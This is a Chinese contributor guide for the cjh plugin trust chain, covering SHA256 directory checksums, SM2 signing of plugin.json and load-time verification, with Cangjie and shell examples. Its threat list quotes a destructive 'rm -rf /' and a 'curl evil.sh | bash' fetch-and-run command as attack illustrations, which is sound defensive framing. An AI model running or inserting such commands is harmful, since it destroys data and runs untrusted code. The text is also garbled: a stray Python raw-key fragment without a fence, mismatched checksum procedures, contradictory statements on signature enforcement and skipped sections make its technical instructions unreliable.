# cjh 插件签名与贡献指南

> 版本：V3 信任链 Step 1（校验和）+ Step 2 预留（SM2 签名）
> 适用：cjh v1.3.0+
> 日期：2026-08-26

## 一、为什么需要签名？

cjh 插件本质是 **shell 脚本**，加载即获得执行能力。没有信任链时，攻击向量包括：

- **供应链投毒**：插件仓库被入侵，`echo_hi.sh` 被替换成 `rm -rf /`
- **中间人篡改**：下载传输中插件包被改
- **恶意发布者**：任何人发个插件，`plugin.json` 里 `"command": "curl evil.sh | bash"`

**信任链回答三个问题**：

| 问题 | 机制 | 状态 |
|---|---|---|
| 插件被篡改过吗？ | SHA256 校验和 | ✅ Step 1 已实现 |
| 这个插件是谁发的？ | SM2 签名 | ⚠️ Step 2 预留 |
| 我该不该信这个发布者？ | 发布者信任列表 | ⚠️ Step 3 待实现 |

## 二、plugin.json 字段规范

### 2.1 基础字段（V2b Step 1，必填）

```json
{
  "name": "my-plugin",
  "version": "1.0.0",
  "tools": [
    {
      "name": "greet",
      "description": "Print a greeting",
      "command": "greet.sh",
      "is_read_only": true,
      "parameters": {
        "type": "object",
        "properties": {
          "who": { "type": "string", "description": "Who to greet" }
        },
        "required": ["who"]
      }
    }
  ]
}
```

### 2.2 校验和字段（V3 Step 1，推荐填写）

```json
{
  "name": "my-plugin",
  "version": "1.0.0",
  "checksum": "a1b2c3d4e5f6...（64 位十六进制 SHA256）",
  "tools": [...]
}
```

**`checksum` 计算规则**：

- 对象 = 插件目录下**除 `plugin.json` 外**的所有文件
- 算法 = 递归收集文件 → 按相对路径字典序排序 → 对每个文件 `SHA256(相对路径 + 文件内容)` → 最终拼接再做一次 SHA256
- 结果 = 64 位小写十六进制字符串

**为什么排除 `plugin.json`？** 因为 `plugin.json` 里存了 `checksum` 字段，hash 它会造成循环依赖。

### 2.3 签名字段（V3 Step 2，可选）

> **签名是可选的**。不带 `checksum`/`publisher`/`pubkey`/`signature` 任一字段的插件照常加载注册工具，签名只是信任链加固，不强推。已有无签名插件可平滑过渡。

```json
{
  "name": "my-plugin",
  "version": "1.0.0",
  "checksum": "a1b2c3d4...",
  "publisher": "github:alice",
  "pubkey": "3059301306072a8648ce3d020106082a811ccf5501822d03420004...（SM2 公钥 DER 编码的 hex）",
  "signature": "3046022100a1b2c3d4...022100e5f67890...（SM2 签名 DER 编码的 hex）",
  "tools": [...]
}
```

**字段说明**：

| 字段 | 类型 | 说明 |
|---|---|---|
| `publisher` | string | 发布者 ID，格式 `<平台>:<用户名>`（如 `github:alice`） |
| `pubkey` | string | 发布者 SM2 公钥，DER 编码的 hex 字符串 |
| `signature` | string | 对 `checksum` 字段值的 SM2 签名，DER 编码的 hex 字符串 |

**签名算法**：SM2 + SM3 摘要（国密标准，仓颉 `stdx.crypto.keys` 原生支持，零外部依赖）。

**签名覆盖范围**：`signature` 签的是 `checksum` 字段的值（那个 64 位十六进制字符串的字节），不是整个 `plugin.json`。因为 `plugin.json` 包含 `signature` 自身，签整个文件会循环依赖。

**DER 编码说明**：
- SM2 公钥 DER：`SubjectPublicKeyInfo` 格式，`SM2PublicKey.encodeToDer()` 生成
- SM2 签名 DER：`SEQUENCE { r INTEGER, s INTEGER }` 格式，`SM2PrivateKey.sign()` 生成

## 四、发布流程

### 4.1 准备工作

1. **组织插件目录**：确保 `plugin.json` 和所有脚本文件就位
2. **填写基础字段**：`name`、`version`、`tools` 等

### 4.2 计算校验和

cjh 提供内置工具计算校验和（V3 Step 1 已实现 `sha256DirExcluding`）。

**方式一：用 cjh 内置命令**（待 V3 Step 3 实现 CLI）

```bash
cjh plugin checksum ./my-plugin
# 输出：a1b2c3d4e5f6...
```

**方式二：手动计算**（当前可用，等价于 `sha256DirExcluding` 的算法）

```bash
# 1. 收集除 plugin.json 外的所有文件，按相对路径排序
cd ./my-plugin
find . -type f ! -name "plugin.json" | sed 's|^\./||' | sort > /tmp/files.txt

# 2. 对每个文件计算 SHA256(相对路径 + 文件内容)，拼接
> /tmp/concat.bin
while read f; do
    printf '%s' "$f" >> /tmp/concat.bin
    cat "$f" >> /tmp/concat.bin
done < /tmp/files.txt

# 3. 最终 SHA256
sha256sum /tmp/concat.bin | awk '{print $1}'
# 输出：a1b2c3d4e5f6...
```

### 4.3 生成 SM2 密钥对（V3 Step 2）

cjh 用仓颉原生 `stdx.crypto.keys.SM2PrivateKey` / `SM2PublicKey`，零外部依赖。

**用仓颉生成密钥对**（推荐，与 cjh 验签同源）：

```cangjie
import stdx.crypto.keys.*
import stdx.crypto.x509.DerBlob
import cjutil.*

main(): Int64 {
    // 1. 生成 SM2 密钥对
    let privateKey = SM2PrivateKey()
    let publicKey = SM2PublicKey(privateKey)

    // 2. 导出公钥 DER → hex（填入 plugin.json 的 pubkey 字段）
    let pubkeyDer = publicKey.encodeToDer()
    let pubkeyHex = bytesToHex(pubkeyDer.body)
    println("pubkey: ${pubkeyHex}")

    // 3. 计算 checksum（见 4.2）
    let checksum = "a1b2c3d4e5f6..."  // sha256DirExcluding 结果

    // 4. 用私钥签名 checksum（SM2 内部用 SM3 摘要）
    let dataBytes = hexToBytes(checksum)
    let signatureBytes = privateKey.sign(dataBytes)

    // 5. 签名 → hex（填入 plugin.json 的 signature 字段）
    let signatureHex = bytesToHex(signatureBytes)
    println("signature: ${signatureHex}")

    return 0
}
```

**私钥保管**：`SM2PrivateKey` 对象可序列化为 PEM/DER 存盘（见 `stdx.crypto.keys.SM2PrivateKey.encodeToDer`）。私钥务必离线保管，不进插件包。

### 4.4 签名

签名流程已包含在 4.3 的仓颉代码里（步骤 4-5）。核心 API：

```cangjie
// 签名：SM2PrivateKey.sign(data: Array<Byte>): Array<Byte>
let signatureBytes = privateKey.sign(hexToBytes(checksum))

// 验签：SM2PublicKey.verify(data: Array<Byte>, sig: Array<Byte>): Bool
// cjh 加载插件时自动调用 verifySm2(pubkeyHex, signatureHex, checksum)
```

**签名内容**：`signature` 签的是 `checksum` 字段值（64 位十六进制字符串）的字节，不是整个 `plugin.json`。

**注意**：SM2 签名内部用 SM3 摘要算法（国密标准），无需手动哈希。`SM2PrivateKey.sign(data)` 会自动对 `data` 做 SM3 摘要再签名。

# 转十六进制
sig_hex = signature.hex()
print(sig_hex)
# 输出：3e7d5f2a...（128 位十六进制）

# 公钥转十六进制
public_key = private_key.public_key()
pub_bytes = public_key.public_bytes(
    encoding=serialization.Encoding.Raw,
    format=serialization.PublicFormat.Raw
)
pub_hex = pub_bytes.hex()
print(pub_hex)
# 输出：9f2a1b8c...（128 位十六进制）
```

### 4.5 填写 plugin.json

将计算结果填入 `plugin.json`：

```json
{
  "name": "my-plugin",
  "version": "1.0.0",
  "checksum": "a1b2c3d4e5f6...",
  "publisher": "github:alice",
  "pubkey": "9f2a1b8c...",
  "signature": "3e7d5f2a...",
  "tools": [...]
}
```

### 4.6 完整发布流程（仓颉原生 SM2）

cjh 信任链完全用仓颉原生 API，零外部依赖（无需 openssl/python）。

**发布程序 `publish.cj`**（插件作者运行，生成带签名的 plugin.json）：

```cangjie
package publish

import stdx.crypto.keys.*
import stdx.crypto.x509.DerBlob
import stdx.encoding.json.*
import std.fs.*
import cjutil.*

main(): Int64 {
    let pluginDir = "./my-plugin"  // 插件目录
    let publisher = "github:alice" // 发布者 ID

    // 1. 计算校验和（排除 plugin.json）
    let checksum = sha256DirExcluding(pluginDir, "plugin.json")
    println("checksum: ${checksum}")

    // 2. 生成 SM2 密钥对（首次发布；已有私钥则 load）
    let privateKey = SM2PrivateKey()
    let publicKey = SM2PublicKey(privateKey)

    // 3. 导出公钥 DER → hex
    let pubkeyDer = publicKey.encodeToDer()
    let pubkeyHex = bytesToHex(pubkeyDer.body)

    // 4. 用私钥签名 checksum
    let signatureBytes = privateKey.sign(hexToBytes(checksum))
    let signatureHex = bytesToHex(signatureBytes)

    // 5. 写入 plugin.json（读现有 JSON，加 4 个字段）
    let jsonPath = pluginDir + "/plugin.json"
    let raw = safeFromUtf8(File.readFrom(jsonPath))
    let obj = JsonValue.fromStr(raw).asObject()
    obj.put("checksum", JsonString(checksum))
    obj.put("publisher", JsonString(publisher))
    obj.put("pubkey", JsonString(pubkeyHex))
    obj.put("signature", JsonString(signatureHex))
    File.writeTo(jsonPath, stringToBytes(obj.toJsonString()))

    println("Done! plugin.json updated with SM2 signature.")
    return 0
}
```

**关键点**：
- 私钥 `SM2PrivateKey` 务必离线保管，不进插件包
- 公钥 `pubkey` 和签名 `signature` 都是 DER 编码的 hex，填入 `plugin.json`
- `checksum` 是 `sha256DirExcluding(pluginDir, "plugin.json")` 的结果（64 位十六进制）

## 五、安装与验证流程

### 5.1 当前已实现（V3 Step 1 + Step 2）

cjh 加载插件时执行以下验证：

```
1. 解析 plugin.json
2. 读取 checksum 字段
3. 如果 checksum 存在：
   a. 计算 sha256DirExcluding(pluginDir, "plugin.json")
   b. 对比计算值与 checksum 字段值
   c. 不匹配 → Log.warn + 拒绝加载（检测篡改）
   d. 匹配 → Log.debug "校验和验证通过"
4. 读取 publisher / pubkey / signature 字段
5. 如果三字段齐全（pubkey + signature + checksum）：
   a. verifySm2(pubkey, signature, checksum) 用仓颉原生 SM2 验签
   b. 验签通过 → Log.debug "SM2 签名验证通过"
   c. 验签失败（Invalid/BadKey/BadSignature/Error）→ Log.warn + 拒绝加载
6. 部分字段存在但不全 → Log.warn "签名字段不完整"，跳过验签（兼容过渡）
7. 注册工具
```

**Step 1 效果**：检测插件目录被篡改（攻击者直接改 `.sh` 文件）。

**Step 2 效果**：防供应链投毒 + 中间人篡改。攻击者改完文件重新算 checksum 也没用——他没有发布者私钥，签不出合法 `signature`。

### 5.2 V3 Step 3 将实现（信任管理 CLI）

```
1. Step 1 + Step 2 验证通过
2. 查 ~/.cjh/trusted-publishers 是否含 publisher 或 pubkey 指纹
3. 不在信任列表 → 提示用户 /cjh trust <publisher>
```

```bash
# 信任发布者
cjh trust github:alice

# 取消信任
cjh untrust github:alice

# 列出已信任发布者
cjh trust-list

# 安装插件（走签名验证流程）
cjh install https://example.com/my-plugin.cjp
```

## 七、常见问题

### Q1：校验和不匹配怎么办？

**现象**：`[PLUGIN] 校验和不匹配，拒绝加载: my-plugin`

**原因**：插件目录下某个文件被改过，但 `plugin.json` 的 `checksum` 没更新。

**解决**：
1. 如果你是发布者：重新计算校验和，更新 `plugin.json`
2. 如果你是用户：重新下载插件，或确认文件改动是预期的后重新计算校验和

### Q2：可以不填 checksum 吗？

可以。`checksum` 是可选字段。不填时 cjh 不做校验和验证，插件正常加载（但无法检测篡改）。

### Q3：SM2 签名什么时候强制？

**当前**：不强制。`publisher` / `pubkey` / `signature` 仅解析记录。

**V3 Step 2 后**：默认不强制（兼容无签名插件），但用户可通过配置 `require_signature = true` 强制要求已安装插件必须有有效签名。

### Q4：如何轮换发布者密钥？

1. 生成新密钥对
2. 用新私钥重新签名所有插件的 `checksum`
3. 更新 `plugin.json` 的 `pubkey` 和 `signature` 字段
4. 用户侧：`/cjh trust <new-pubkey-fingerprint>` 信任新公钥

### Q5：校验和算法为什么这么复杂？

因为需要**确定性**和**跨平台**：
- 文件遍历顺序在不同 OS/FS 上可能不同 → 按相对路径字典序排序
- 路径分隔符 Windows 是 `\`，Unix 是 `/` → 统一为 `/`
- 单独 hash 每个文件再拼接 → 避免大文件一次性读入内存

// libs/cjutil/src/sha256.cj
public func sha256DirExcluding(dirPath: String, excludeFile: String): String {
    // 1. 递归收集目录下所有文件
    // 2. 排除 excludeFile
    // 3. 按相对路径字典序排序
    // 4. 对每个文件 update(hash(相对路径) + hash(文件内容))
    // 5. finish() 返回 32 字节目录指纹的十六进制字符串
}
```
